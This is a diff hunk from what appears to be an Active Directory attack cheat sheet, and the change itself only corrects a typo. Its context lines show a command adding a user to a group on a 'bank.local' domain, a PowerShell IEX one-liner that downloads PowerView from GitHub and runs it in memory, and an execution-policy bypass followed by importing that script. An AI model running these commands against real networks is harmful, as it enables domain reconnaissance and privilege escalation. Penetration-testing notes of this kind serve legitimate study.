@@ -88,7 +88,7 @@ $Group.Add("LDAP://CN=master,CN=Users,DC=bank,DC=local")
 ```bash
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 ```
--or downloade the script and run by import
+- or download the script and run by import
 ```bash
 powershell -ep bypass
 Import-Module .\powerview.ps1
